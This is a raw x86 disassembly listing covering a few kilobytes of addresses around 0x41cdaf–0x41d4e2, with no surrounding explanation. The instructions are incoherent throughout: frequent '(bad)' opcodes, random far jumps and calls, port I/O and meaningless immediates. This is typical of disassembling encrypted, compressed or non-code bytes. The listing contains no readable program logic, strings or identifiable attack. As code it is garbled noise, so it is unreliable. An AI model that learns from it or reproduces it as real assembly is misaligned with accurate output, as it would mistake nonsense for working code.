  41cdaf:	xchg   DWORD PTR [eax-0x45],ebp
  41cdb2:	jne    0x41ce0a
  41cdb4:	leave  
  41cdb5:	lahf   
  41cdb6:	aaa    
  41cdb7:	jno    0x41cd9c
  41cdb9:	and    dh,ah
  41cdbb:	(bad)  
  41cdbc:	jbe    0x41ce2f
  41cdbe:	xchg   edx,eax
  41cdbf:	(bad)  
  41cdc0:	sub    ecx,esp
  41cdc2:	jp     0x41cdd4
  41cdc4:	add    ebp,ebx
  41cdc6:	sbb    esp,0xb6841a81
  41cdcc:	loopne 0x41cd71
  41cdce:	jb     0x41ce37
  41cdd0:	and    al,0xe6
  41cdd2:	call   0x77c6cfa0
  41cdd7:	or     eax,0x4c8054
  41cddc:	mov    dl,0x5c
  41cdde:	sbb    ecx,0x97afb1d3
  41cde4:	push   ss
  41cde5:	xor    eax,0x201b55fb
  41cdeb:	bound  eax,QWORD PTR [esi]
  41cded:	lods   eax,DWORD PTR ds:[esi]
  41cdee:	sar    BYTE PTR [ebx+0x562d2471],cl
  41cdf4:	sti    
  41cdf5:	add    esi,DWORD PTR [ecx+ecx*4]
  41cdf8:	push   esi
  41cdf9:	rol    ecx,0xba
  41cdfc:	add    BYTE PTR [edx+0x3890f3cd],dl
  41ce02:	test   al,0xc0
  41ce04:	cld    
  41ce05:	outs   dx,DWORD PTR ds:[esi]
  41ce06:	mov    bl,BYTE PTR [ebx+0x3ae72e17]
  41ce0c:	mov    al,ds:0x2cf32b53
  41ce11:	or     edx,DWORD PTR [edi]
  41ce13:	js     0x41cde6
  41ce15:	mov    edx,0x7b88c54a
  41ce1a:	outs   dx,BYTE PTR ds:[esi]
  41ce1b:	push   ecx
  41ce1c:	fs push ebx
  41ce1e:	sub    al,0xed
  41ce20:	in     eax,dx
  41ce21:	ins    BYTE PTR es:[edi],dx
  41ce22:	inc    eax
  41ce23:	mov    es,WORD PTR [esp+edx*8]
  41ce26:	shl    DWORD PTR [edi-0x6d],0xb9
  41ce2a:	fidivr DWORD PTR [ecx+0x6cf239d0]
  41ce30:	or     edx,DWORD PTR [edx+eiz*2+0x49287672]
  41ce37:	mov    dl,0xb8
  41ce39:	and    ebx,DWORD PTR [esi+0x3b]
  41ce3c:	pop    eax
  41ce3d:	push   eax
  41ce3e:	mov    ah,0x3b
  41ce40:	jne    0x41ce63
  41ce42:	loop   0x41cead
  41ce44:	lahf   
  41ce45:	(bad)  [ebp-0x61]
  41ce48:	ss jb  0x41ceb0
  41ce4b:	fidivr WORD PTR [edx+esi*8]
  41ce4e:	cs push ebp
  41ce50:	daa    
  41ce51:	cmp    DWORD PTR [edi+0x4c9b47c0],eax
  41ce57:	lods   al,BYTE PTR ds:[esi]
  41ce58:	xor    DWORD PTR [eax+0x3858c976],esp
  41ce5e:	cmp    BYTE PTR [eax+0x6b],dh
  41ce61:	or     esp,DWORD PTR [edx-0xd]
  41ce64:	jb     0x41ce76
  41ce66:	dec    esp
  41ce67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ce68:	pop    ds
  41ce69:	ret    
  41ce6a:	inc    edx
  41ce6b:	dec    esp
  41ce6c:	adc    eax,0x18b95d14
  41ce71:	jecxz  0x41ce7e
  41ce73:	std    
  41ce74:	fst    DWORD PTR [edi-0x6e]
  41ce77:	imul   esp,DWORD PTR [ebx+0x13898d27],0xffffffc2
  41ce7e:	xor    DWORD PTR [ebx+0x6877701d],edi
  41ce84:	iret   
  41ce85:	sbb    BYTE PTR [edi-0x1],bl
  41ce88:	mov    BYTE PTR [esi],al
  41ce8a:	lods   al,BYTE PTR ds:[esi]
  41ce8b:	adc    esi,DWORD PTR [ebx+0x285f9ac2]
  41ce91:	jb     0x41cedd
  41ce93:	jo     0x41ce1e
  41ce95:	mov    eax,0x8f3ed30
  41ce9a:	pop    eax
  41ce9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ce9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ce9d:	or     al,BYTE PTR [ebp+0x98f3c56]
  41cea3:	inc    ebx
  41cea4:	fwait
  41cea5:	or     BYTE PTR [eax],al
  41cea7:	push   cs
  41cea8:	dec    edx
  41cea9:	clc    
  41ceaa:	add    DWORD PTR [esi+0x17e94313],0x3dc10820
  41ceb4:	das    
  41ceb5:	and    al,0xf0
  41ceb7:	aam    0xfb
  41ceb9:	aam    0x2f
  41cebb:	jmp    FWORD PTR [esi+0x33]
  41cebe:	je     0x41ce76
  41cec0:	pop    edx
  41cec1:	retf   
  41cec2:	nop
  41cec3:	shl    DWORD PTR [edi-0x75],0x1
  41cec7:	add    al,ch
  41cec9:	add    DWORD PTR [eax],eax
  41cecb:	add    BYTE PTR [edx-0x9c18371],al
  41ced1:	(bad)  
  41ced2:	loop   0x41ceb3
  41ced4:	test   ah,cl
  41ced6:	pop    ecx
  41ced7:	scas   al,BYTE PTR es:[edi]
  41ced8:	daa    
  41ced9:	cmp    ebp,0xffffffb0
  41cedc:	fld    QWORD PTR [edx-0x1c]
  41cedf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cee0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cee1:	sti    
  41cee2:	jl     0x41ce76
  41cee4:	sub    eax,0x3b927deb
  41cee9:	xchg   ebp,eax
  41ceea:	call   0x54b77024
  41ceef:	(bad)  
  41cef0:	daa    
  41cef1:	dec    bx
  41cef3:	pop    esi
  41cef4:	stos   DWORD PTR es:[edi],eax
  41cef5:	push   edi
  41cef6:	js     0x41cf42
  41cef8:	(bad)  
  41cef9:	hlt    
  41cefa:	test   BYTE PTR ds:0x8491468a,0xf2
  41cf01:	loop   0x41cee3
  41cf03:	cmp    eax,DWORD PTR ds:0xede18462
  41cf09:	inc    ecx
  41cf0a:	pop    esi
  41cf0b:	test   BYTE PTR [eax],0xcc
  41cf0e:	(bad)  
  41cf0f:	cmp    BYTE PTR [esi],ah
  41cf11:	ss push ds
  41cf13:	fisubr DWORD PTR [esi+0x78]
  41cf16:	or     eax,0x6f5f57dc
  41cf1b:	mov    dl,BYTE PTR [eax]
  41cf1d:	neg    esp
  41cf1f:	pushf  
  41cf20:	pop    esi
  41cf21:	and    al,0x6b
  41cf23:	loope  0x41cf00
  41cf25:	jecxz  0x41cfa3
  41cf27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cf28:	mov    dh,0xfe
  41cf2a:	outs   dx,BYTE PTR ds:[esi]
  41cf2b:	fcom   DWORD PTR [ecx]
  41cf2d:	aaa    
  41cf2e:	mov    eax,0x47a1cb5a
  41cf33:	in     al,0x7a
  41cf35:	dec    esi
  41cf36:	inc    edx
  41cf37:	(bad)  
  41cf38:	cwde   
  41cf39:	xor    al,0xd3
  41cf3b:	adc    DWORD PTR [ebx-0x6da016f],ebx
  41cf41:	push   ss
  41cf42:	rol    edx,0x9d
  41cf45:	stos   DWORD PTR es:[edi],eax
  41cf46:	pop    esp
  41cf47:	mov    cl,0x65
  41cf49:	loop   0x41cef9
  41cf4b:	ja     0x41ceeb
  41cf4d:	add    DWORD PTR [edx],esi
  41cf4f:	sar    BYTE PTR [edx+0x45],1
  41cf52:	xor    bh,bl
  41cf54:	int    0x4e
  41cf56:	dec    eax
  41cf57:	out    dx,eax
  41cf58:	fs add eax,0x52b0999f
  41cf5e:	xchg   edx,eax
  41cf5f:	in     al,dx
  41cf60:	or     ah,dh
  41cf62:	push   cs
  41cf63:	lods   eax,DWORD PTR ds:[esi]
  41cf64:	mov    ebx,gs
  41cf66:	adc    eax,0xc3b6ef02
  41cf6b:	adc    eax,0x25923573
  41cf70:	lods   eax,DWORD PTR ds:[esi]
  41cf71:	test   BYTE PTR [ebx-0x4e],0xfb
  41cf75:	shl    DWORD PTR [eax+edx*8+0x3ad91031],1
  41cf7c:	sbb    al,0x57
  41cf7e:	lods   al,BYTE PTR ds:[esi]
  41cf7f:	xchg   ebp,eax
  41cf80:	pushf  
  41cf81:	call   0x5f6e051c
  41cf86:	and    al,0x2b
  41cf88:	mov    edi,0xa16312b3
  41cf8d:	fwait
  41cf8e:	mov    al,ds:0x76d651f
  41cf93:	pop    edx
  41cf94:	cmp    al,0xe1
  41cf96:	inc    edi
  41cf97:	dec    eax
  41cf98:	rcl    eax,1
  41cf9a:	pandn  mm4,QWORD PTR [ecx+0x4df0bd5a]
  41cfa1:	into   
  41cfa2:	and    ch,ah
  41cfa4:	pop    ebx
  41cfa5:	inc    DWORD PTR [edx+0x5b9028c2]
  41cfab:	inc    ebp
  41cfac:	lock vpmullw xmm4,xmm3,XMMWORD PTR [esi]
  41cfb1:	and    BYTE PTR [ebp+ebp*4-0x32046122],bl
  41cfb8:	sbb    al,0x21
  41cfba:	jo     0x41d018
  41cfbc:	test   DWORD PTR [ebp-0x7c],esi
  41cfbf:	call   0x8976:0xdc1d833d
  41cfc6:	(bad)
  41cfca:	fwait
  41cfcb:	icebp  
  41cfcc:	mov    BYTE PTR [edx+0x1],ah
  41cfcf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cfd0:	(bad)  [ebx-0x6a840167]
  41cfd6:	xchg   esi,eax
  41cfd7:	imul   esi,DWORD PTR [edx],0xffffffd1
  41cfda:	pop    es
  41cfdb:	fdiv   st(2),st
  41cfdd:	push   eax
  41cfde:	inc    ecx
  41cfdf:	outs   dx,DWORD PTR ds:[esi]
  41cfe0:	cwde   
  41cfe1:	xchg   esi,eax
  41cfe2:	bound  edx,QWORD PTR [edi]
  41cfe4:	or     ch,BYTE PTR [eax+0x7b]
  41cfe7:	fwait
  41cfe8:	mov    dl,0x8
  41cfea:	fisub  WORD PTR [ebx+0x183f351c]
  41cff0:	lahf   
  41cff1:	xor    eax,DWORD PTR [eax-0x51014328]
  41cff7:	xchg   DWORD PTR ds:0x1360eeb6,ebx
  41cffd:	mov    BYTE PTR [ecx+0x6e],bh
  41d000:	lds    ebp,FWORD PTR [esi-0x6b]
  41d003:	jmp    0x41d025
  41d005:	sub    DWORD PTR [ecx],esp
  41d007:	xchg   edx,eax
  41d008:	sahf   
  41d009:	(bad)  
  41d00a:	fimul  DWORD PTR [ebx-0x29]
  41d00d:	jns    0x41cfd7
  41d00f:	ins    BYTE PTR es:[edi],dx
  41d010:	lock sbb eax,0xe6076427
  41d016:	scas   eax,DWORD PTR es:[edi]
  41d017:	add    BYTE PTR [ecx+0x4d],0x5b
  41d01b:	push   ebx
  41d01c:	loopne 0x41d091
  41d01e:	scas   al,BYTE PTR es:[edi]
  41d01f:	cmc    
  41d020:	adc    DWORD PTR [eax-0x2ffbeeab],esi
  41d026:	jge    0x41d00e
  41d028:	xchg   edx,eax
  41d029:	test   eax,0x89a1ff53
  41d02e:	data16 in al,dx
  41d030:	lock pop edi
  41d032:	adc    DWORD PTR [ecx+0x5fae9648],ecx
  41d038:	jne    0x41cfbb
  41d03a:	or     esi,edx
  41d03c:	mov    ch,0x81
  41d03e:	ficomp DWORD PTR [ebp+0x7c539026]
  41d044:	adc    eax,0x45ba637d
  41d049:	inc    esi
  41d04a:	das    
  41d04b:	adc    ah,dh
  41d04d:	repnz sub esp,eax
  41d050:	shl    eax,1
  41d052:	xchg   ecx,eax
  41d053:	inc    ebx
  41d054:	aad    0xac
  41d056:	ret    0x8ca6
  41d059:	mov    ch,0x93
  41d05b:	inc    esi
  41d05c:	mov    edx,0xf4c8ec20
  41d061:	rcl    BYTE PTR [edx+0x23],1
  41d064:	popf   
  41d065:	paddd  mm2,QWORD PTR [ecx-0x32]
  41d069:	mov    dh,0x87
  41d06b:	out    dx,al
  41d06c:	xchg   esp,eax
  41d06d:	push   0xa5284816
  41d072:	fld    TBYTE PTR [ecx+0x18d7e62]
  41d078:	and    BYTE PTR ds:0xc9ce5575,ah
  41d07e:	scas   al,BYTE PTR es:[edi]
  41d07f:	sbb    al,0x8a
  41d081:	test   eax,0x395b6cf3
  41d086:	push   eax
  41d087:	ret    
  41d088:	hlt    
  41d089:	cmp    eax,0x15d4e7a6
  41d08e:	push   ecx
  41d08f:	jle    0x41d05f
  41d091:	sub    DWORD PTR [ecx+0x52454e7d],edx
  41d097:	out    dx,eax
  41d098:	out    0xc8,eax
  41d09a:	ds fdivp st(0),st
  41d09d:	shr    BYTE PTR [ebx-0x6c42cf29],cl
  41d0a3:	jno    0x41d0ad
  41d0a5:	pushf  
  41d0a6:	imul   eax,DWORD PTR [ecx],0x14
  41d0a9:	adc    BYTE PTR [esi],bh
  41d0ab:	mov    bh,0xa
  41d0ad:	retf   
  41d0ae:	mov    ds:0x5de96d8,eax
  41d0b3:	pop    ecx
  41d0b4:	retf   0x76a0
  41d0b7:	dec    ebp
  41d0b8:	jle    0x41d099
  41d0ba:	sti    
  41d0bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d0bc:	mov    bh,0x83
  41d0be:	dec    edi
  41d0bf:	mov    ds:0x68afbd7b,al
  41d0c4:	dec    edi
  41d0c5:	lea    eax,[ecx]
  41d0c7:	add    al,ch
  41d0c9:	add    DWORD PTR [eax],eax
  41d0cb:	add    ch,ah
  41d0cd:	dec    ecx
  41d0ce:	cmp    al,0x11
  41d0d0:	ins    BYTE PTR es:[edi],dx
  41d0d1:	push   ebx
  41d0d2:	pop    es
  41d0d3:	fs cdq 
  41d0d5:	push   cs
  41d0d6:	mov    esp,0x7423f233
  41d0db:	adc    BYTE PTR [ebp+0x56],0x8d
  41d0df:	sub    DWORD PTR [ebp-0xd2ef0b8],ebp
  41d0e5:	stc    
  41d0e6:	cmp    BYTE PTR [edx-0xd3acabb],0x10
  41d0ed:	cmp    al,0x4
  41d0ef:	loop   0x41d15a
  41d0f1:	jb     0x41d0bb
  41d0f3:	(bad)  
  41d0f5:	cs fs jo 0x41d15c
  41d0f9:	jp     0x41d083
  41d0fb:	push   edx
  41d0fc:	adc    eax,0xb9467800
  41d101:	push   DWORD PTR [esi+0x14]
  41d104:	(bad)
  41d108:	in     al,dx
  41d109:	inc    eax
  41d10a:	(bad)  
  41d10b:	arpl   cx,bx
  41d10d:	dec    eax
  41d10e:	aad    0x6b
  41d110:	fwait
  41d111:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d112:	ins    BYTE PTR es:[edi],dx
  41d113:	push   ebp
  41d114:	mov    edx,0x692e85a7
  41d119:	jecxz  0x41d17a
  41d11b:	outs   dx,DWORD PTR ds:[esi]
  41d11c:	dec    ecx
  41d11d:	fist   DWORD PTR [eax+0xfa96351]
  41d123:	jmp    0x1b682931
  41d128:	dec    esp
  41d129:	add    BYTE PTR [ebp-0x4d],bh
  41d12c:	out    0xb9,al
  41d12e:	jb     0x41d177
  41d130:	sar    DWORD PTR [ebp-0x43],1
  41d133:	pmaxub mm0,mm2
  41d136:	rcl    BYTE PTR [eax-0x42],0x28
  41d13a:	out    dx,eax
  41d13b:	and    BYTE PTR [esi],al
  41d13d:	push   ebp
  41d13e:	push   esp
  41d13f:	push   edi
  41d140:	leave  
  41d141:	mov    ebp,0x8c2c9314
  41d146:	enter  0xdef4,0x76
  41d14a:	sub    esi,esp
  41d14c:	xor    DWORD PTR [esi+ecx*4],esi
  41d14f:	lock out 0x7e,eax
  41d152:	cdq    
  41d153:	xchg   edi,eax
  41d154:	xchg   ebp,eax
  41d155:	test   BYTE PTR [esi-0x57],cl
  41d158:	sub    bh,BYTE PTR [esi-0x32]
  41d15b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d15c:	rcr    DWORD PTR [edx],cl
  41d15e:	sub    ecx,esp
  41d160:	dec    edx
  41d161:	(bad)  
  41d162:	xchg   edi,eax
  41d163:	xlat   BYTE PTR ds:[ebx]
  41d164:	mov    ebp,0x7ca537c0
  41d169:	sbb    edi,ecx
  41d16b:	add    esp,esi
  41d16d:	fldcw  WORD PTR [edx]
  41d16f:	test   DWORD PTR [ecx+0x5f],esp
  41d172:	inc    ecx
  41d173:	(bad)  
  41d174:	sti    
  41d175:	enter  0x3e5f,0xf0
  41d179:	scas   al,BYTE PTR es:[edi]
  41d17a:	retf   
  41d17b:	inc    ebp
  41d17c:	jmp    0xa7dd:0x43a8ef55
  41d183:	sub    DWORD PTR [edx-0xf],ebx
  41d186:	xchg   esi,eax
  41d187:	imul   ebx,DWORD PTR [edi],0xb32c4822
  41d18d:	cmp    eax,0xc1d6740c
  41d192:	test   al,0xa5
  41d194:	inc    edx
  41d195:	dec    edx
  41d196:	(bad)  
  41d197:	mov    ebx,0x6d168a01
  41d19c:	mov    cl,BYTE PTR [ecx-0x2260b1ec]
  41d1a2:	ret    0x1c6f
  41d1a5:	and    eax,0x2c1103e4
  41d1aa:	fnstsw WORD PTR [ebp+0x8edae9e]
  41d1b0:	mov    esp,0x92004c3c
  41d1b5:	cld    
  41d1b6:	fisttp WORD PTR [ecx]
  41d1b8:	(bad)  
  41d1b9:	test   BYTE PTR [ebx+0x4f],0x93
  41d1bd:	pop    esp
  41d1be:	stc    
  41d1bf:	das    
  41d1c0:	dec    ebp
  41d1c1:	popf   
  41d1c2:	jnp    0x41d154
  41d1c4:	dec    esi
  41d1c5:	pop    es
  41d1c6:	push   ebp
  41d1c7:	cmp    DWORD PTR [edx+0x72116a23],0xffffffa4
  41d1ce:	test   DWORD PTR [edx+edx*4],ebp
  41d1d1:	add    al,0x28
  41d1d3:	lods   al,BYTE PTR ds:[esi]
  41d1d4:	inc    edi
  41d1d5:	mov    ch,0xe0
  41d1d7:	mov    edx,0x5970940
  41d1dc:	lds    edi,FWORD PTR [esp+edx*8-0x35]
  41d1e0:	aam    0x73
  41d1e2:	cld    
  41d1e3:	fisttp QWORD PTR [esi-0x1e808e70]
  41d1e9:	inc    esp
  41d1ea:	das    
  41d1eb:	jmp    0xab9b:0x13ef60b0
  41d1f2:	imul   esi
  41d1f4:	add    DWORD PTR [ebx+0x66d0f365],esp
  41d1fa:	push   0x40
  41d1fc:	add    al,0xc9
  41d1fe:	cmp    BYTE PTR [eax+0x3e],ch
  41d201:	xor    eax,0x2d48ce59
  41d206:	xor    ebp,DWORD PTR [eax+0x6ffea3d9]
  41d20c:	nop
  41d20d:	xor    dh,bh
  41d20f:	mov    ds:0x562150ac,eax
  41d214:	add    ch,BYTE PTR [esi+0x65]
  41d217:	adc    al,0x69
  41d219:	and    dh,0xe1
  41d21c:	in     eax,0xd3
  41d21e:	and    DWORD PTR [edx-0x7b],0x6693f607
  41d225:	lea    edx,[ecx-0x78]
  41d228:	jecxz  0x41d286
  41d22a:	adc    ch,BYTE PTR [ecx+0x43]
  41d22d:	push   ebx
  41d22e:	jge    0x41d295
  41d230:	inc    esp
  41d231:	sub    ebp,DWORD PTR [edi]
  41d233:	xchg   edi,eax
  41d234:	mov    dl,0xe2
  41d236:	hlt    
  41d237:	cmp    ah,dh
  41d239:	inc    ecx
  41d23a:	xor    ah,BYTE PTR [ebp-0x17]
  41d23d:	lds    edx,FWORD PTR [esi]
  41d23f:	add    DWORD PTR [ebx],0x4
  41d242:	xchg   ebp,eax
  41d243:	jae    0x41d2a7
  41d245:	cli    
  41d246:	test   dl,dh
  41d248:	jne    0x41d1d0
  41d24a:	xchg   ebx,eax
  41d24b:	into   
  41d24c:	gs push 0x197ced71
  41d252:	sar    dl,1
  41d254:	and    DWORD PTR [ebx],eax
  41d256:	js     0x41d2ab
  41d258:	or     eax,0xe6208910
  41d25d:	xor    ch,BYTE PTR [esi]
  41d25f:	mov    dl,0x0
  41d261:	cmp    eax,0x8b046841
  41d266:	push   esp
  41d267:	sbb    edi,DWORD PTR [edx]
  41d269:	(bad)  
  41d26a:	lods   al,BYTE PTR ds:[esi]
  41d26b:	dec    BYTE PTR [eax]
  41d26d:	inc    edi
  41d26e:	out    dx,eax
  41d26f:	ss inc ebp
  41d271:	mul    BYTE PTR [eax]
  41d273:	xchg   ebx,eax
  41d274:	or     al,0x93
  41d276:	cli    
  41d277:	rcl    DWORD PTR [esi],cl
  41d279:	test   eax,0xe99bf33b
  41d27e:	mov    edx,esi
  41d280:	xchg   esi,eax
  41d281:	aaa    
  41d282:	(bad)  
  41d283:	push   ss
  41d284:	sti    
  41d285:	mov    bh,0x85
  41d287:	ret    0xf8d7
  41d28a:	(bad)  
  41d28b:	and    ebx,edi
  41d28d:	push   ecx
  41d28e:	jns    0x41d24e
  41d290:	cmc    
  41d291:	mov    al,BYTE PTR [edi]
  41d293:	clc    
  41d294:	out    dx,eax
  41d295:	aam    0xc2
  41d297:	repz in al,0x8a
  41d29a:	sub    eax,0x9688df77
  41d29f:	repz loopne 0x41d2c3
  41d2a2:	rcl    DWORD PTR [esi],0x5a
  41d2a5:	int    0x7b
  41d2a7:	jae    0x41d2b2
  41d2a9:	pop    esi
  41d2aa:	dec    edx
  41d2ab:	sbb    DWORD PTR [eax-0x63],0xbe81828b
  41d2b2:	sbb    ch,BYTE PTR [edx]
  41d2b4:	(bad)  
  41d2b5:	out    dx,al
  41d2b6:	lods   al,BYTE PTR ds:[esi]
  41d2b7:	cmp    ch,BYTE PTR [edx+edi*2+0x5223fed6]
  41d2be:	stc    
  41d2bf:	stc    
  41d2c0:	arpl   WORD PTR [ebx],dx
  41d2c2:	mov    cl,0x8c
  41d2c4:	aaa    
  41d2c5:	pop    DWORD PTR [ecx]
  41d2c7:	add    al,ch
  41d2c9:	add    DWORD PTR [eax],eax
  41d2cb:	add    BYTE PTR [edx+0x415d4c54],dl
  41d2d1:	jp     0x41d2df
  41d2d3:	mov    ds:0x79b15a1,al
  41d2d8:	popf   
  41d2d9:	punpcklwd mm4,DWORD PTR [ecx+ebp*2-0x2bdfd3db]
  41d2e1:	ficom  WORD PTR [esi]
  41d2e3:	hlt    
  41d2e4:	rol    eax,cl
  41d2e6:	dec    ecx
  41d2e7:	inc    esp
  41d2e8:	std    
  41d2e9:	and    cl,BYTE PTR [ecx]
  41d2eb:	dec    edi
  41d2ec:	in     al,0xd9
  41d2ee:	and    al,0x24
  41d2f0:	test   al,0xeb
  41d2f2:	loope  0x41d362
  41d2f4:	mov    al,0x3c
  41d2f6:	add    eax,0xe8a23dfa
  41d2fb:	es inc ecx
  41d2fd:	jb     0x41d2ca
  41d2ff:	ss aaa 
  41d301:	out    dx,eax
  41d302:	das    
  41d303:	call   0xf393fe56
  41d308:	std    
  41d309:	cwde   
  41d30a:	jmp    0xb7e7:0x304cba66
  41d311:	mov    dl,dl
  41d313:	dec    ebp
  41d314:	std    
  41d315:	push   edx
  41d316:	mov    ch,0x20
  41d318:	aas    
  41d319:	mov    dl,0x90
  41d31b:	clc    
  41d31c:	pusha  
  41d31d:	jecxz  0x41d37a
  41d31f:	test   al,0xe5
  41d321:	pop    ss
  41d322:	pop    es
  41d323:	sub    ecx,DWORD PTR [ebx+0x7e]
  41d326:	jp     0x41d33d
  41d328:	shr    BYTE PTR [ecx],0xea
  41d32b:	and    eax,0xa7e03a33
  41d330:	dec    esp
  41d331:	push   0x7a
  41d333:	leave  
  41d334:	jb     0x41d379
  41d336:	mov    ebp,DWORD PTR [ebx]
  41d338:	pop    es
  41d339:	ins    DWORD PTR es:[edi],dx
  41d33a:	outs   dx,BYTE PTR ds:[esi]
  41d33b:	mov    WORD PTR [edi-0x34],es
  41d33e:	pop    ecx
  41d33f:	stos   BYTE PTR es:[edi],al
  41d340:	jo     0x41d2d0
  41d342:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d343:	neg    BYTE PTR [edi]
  41d345:	call   0x1be8:0x78718be
  41d34c:	in     al,0xe7
  41d34e:	xor    cl,BYTE PTR [eax-0x38]
  41d351:	ja     0x41d356
  41d353:	dec    ebp
  41d354:	test   BYTE PTR [edi+0x10],dl
  41d357:	out    0x2e,eax
  41d359:	out    0xcc,eax
  41d35b:	clc    
  41d35c:	out    dx,eax
  41d35d:	xchg   ebp,esi
  41d35f:	xchg   ebx,eax
  41d360:	mov    ch,0x50
  41d362:	ds or  eax,esi
  41d365:	fisubr WORD PTR [eax+0x7d]
  41d368:	xchg   edx,eax
  41d369:	shl    BYTE PTR [esi+ebp*2+0x24d9444d],0x27
  41d371:	mov    edi,0xdeaba3da
  41d376:	inc    edx
  41d377:	and    ecx,esp
  41d379:	pop    esp
  41d37a:	mov    ebx,0xafabc9e5
  41d37f:	pop    esp
  41d380:	sti    
  41d381:	sub    BYTE PTR [ecx+esi*4-0x4f6c7a52],ah
  41d388:	ss int 0xc3
  41d38b:	cmp    BYTE PTR [ebp+esi*1+0x59619086],dl
  41d392:	push   ebx
  41d393:	sub    al,0xf7
  41d395:	das    
  41d396:	iret   
  41d397:	xchg   ecx,eax
  41d398:	cmc    
  41d399:	mov    esp,0x4410baf4
  41d39e:	ss mov edi,0x8289f900
  41d3a4:	and    bl,BYTE PTR [ecx-0x1f]
  41d3a7:	and    eax,0xd8c8ce26
  41d3ac:	or     DWORD PTR [ebp+esi*4+0x57],edx
  41d3b0:	xchg   ecx,eax
  41d3b1:	ret    0x5a8c
  41d3b4:	fcmovu st,st(2)
  41d3b6:	and    BYTE PTR [ecx],cl
  41d3b8:	pop    esi
  41d3b9:	fs stos DWORD PTR es:[edi],eax
  41d3bb:	popa   
  41d3bc:	clc    
  41d3bd:	(bad)
  41d3c0:	scas   al,BYTE PTR es:[edi]
  41d3c1:	xor    eax,0xdc5df844
  41d3c6:	sahf   
  41d3c7:	mov    esi,0x9795b761
  41d3cc:	xor    bl,BYTE PTR [edx-0x60f1eaba]
  41d3d2:	or     BYTE PTR [ebp+0x7181e3a5],ch
  41d3d8:	loope  0x41d3e0
  41d3da:	dec    esp
  41d3db:	jne    0x41d40c
  41d3dd:	cmp    ebx,DWORD PTR [edx+0x72]
  41d3e0:	stos   BYTE PTR es:[edi],al
  41d3e1:	sub    edi,eax
  41d3e3:	fs retf 
  41d3e5:	sbb    al,0x7d
  41d3e7:	stos   BYTE PTR es:[edi],al
  41d3e8:	pop    esi
  41d3e9:	inc    ax
  41d3eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d3ec:	pop    es
  41d3ed:	ins    DWORD PTR es:[edi],dx
  41d3ee:	cmp    bh,BYTE PTR [ebx-0x520a1b5b]
  41d3f4:	pop    esp
  41d3f5:	inc    edx
  41d3f6:	push   ebx
  41d3f7:	test   al,0xac
  41d3f9:	inc    esp
  41d3fa:	loope  0x41d429
  41d3fc:	cmp    al,0xf
  41d3fe:	jmp    0x41d47e
  41d400:	inc    ecx
  41d401:	fmul   DWORD PTR es:[eax]
  41d404:	ret    0x7309
  41d407:	pop    esi
  41d408:	xchg   ecx,eax
  41d409:	cmp    DWORD PTR [edi+0x31],esp
  41d40c:	mov    edx,0x2fa2cc0
  41d411:	or     ebp,esp
  41d413:	retf   0x9ba6
  41d416:	enter  0xf0db,0x42
  41d41a:	into   
  41d41b:	js     0x41d44a
  41d41d:	xor    al,0x46
  41d41f:	cwde   
  41d420:	inc    edi
  41d421:	dec    esp
  41d422:	jg     0x41d41f
  41d424:	jp     0x41d3db
  41d426:	inc    edi
  41d427:	mov    gs,WORD PTR [ebp+0x7a5ee7e2]
  41d42d:	mov    ss,WORD PTR [ebp+0x32]
  41d430:	mov    al,0x68
  41d432:	jecxz  0x41d465
  41d434:	xchg   edi,esp
  41d436:	xchg   ecx,eax
  41d437:	out    dx,al
  41d438:	cmp    eax,0xec2cddf6
  41d43d:	pop    ds
  41d43e:	repnz fs mov ecx,0xa98ff898
  41d445:	fdivr  st,st(3)
  41d447:	fistp  QWORD PTR ds:0x4167ee17
  41d44d:	popa   
  41d44e:	aam    0x2a
  41d450:	ins    BYTE PTR es:[edi],dx
  41d451:	shr    BYTE PTR [edx-0x4a2b4e9b],0x6b
  41d458:	sub    edi,eax
  41d45a:	jl     0x41d4c1
  41d45c:	adc    BYTE PTR [edx+ecx*8],dl
  41d45f:	sub    al,0xa7
  41d461:	inc    ecx
  41d462:	push   eax
  41d463:	mov    al,0x70
  41d465:	stc    
  41d466:	gs mov eax,0x113c1de9
  41d46c:	cdq    
  41d46d:	dec    edi
  41d46e:	dec    ebx
  41d46f:	inc    edx
  41d470:	ja     0x41d40e
  41d472:	shr    BYTE PTR [esi*4+0x4d8ac5b1],0x49
  41d47a:	jg     0x41d4e1
  41d47c:	mov    al,ds:0xb30113f4
  41d481:	cmp    esi,DWORD PTR [esi]
  41d483:	xor    DWORD PTR [ecx+0x3797abfb],esp
  41d489:	mov    ebp,0xa5740f8e
  41d48e:	(bad)  
  41d48f:	enter  0x4f1c,0x58
  41d493:	xor    BYTE PTR [ecx],dl
  41d495:	and    esi,esi
  41d497:	(bad)  
  41d498:	iret   
  41d499:	leave  
  41d49a:	and    al,0x4a
  41d49c:	xor    ebx,DWORD PTR [edi]
  41d49e:	out    0x1a,al
  41d4a0:	xchg   esp,eax
  41d4a1:	cmp    BYTE PTR [edi+esi*2],dh
  41d4a4:	cmp    BYTE PTR [edx+0x73],al
  41d4a7:	nop
  41d4a8:	push   edi
  41d4a9:	add    BYTE PTR [esi-0x5ab0ff9f],dh
  41d4af:	jo     0x41d52c
  41d4b1:	sub    bh,BYTE PTR [eax+0x40345233]
  41d4b7:	gs data16 jne 0x41d532
  41d4bb:	aaa    
  41d4bc:	push   0x326a4e09
  41d4c1:	(bad)  
  41d4c2:	bound  esp,QWORD PTR [edi+ebx*1-0x6f]
  41d4c6:	add    DWORD PTR [eax],eax
  41d4c8:	call   0x9e41d4ce
  41d4cd:	je     0x41d4ab
  41d4cf:	cdq    
  41d4d0:	lahf   
  41d4d1:	ret    0x6227
  41d4d4:	add    ebx,DWORD PTR [ebx-0x6be17319]
  41d4da:	push   0x7feabbbb
  41d4df:	daa    
  41d4e0:	add    dh,BYTE PTR [ebx]
  41d4e2:	ins    DWORD PTR es:[edi],dx
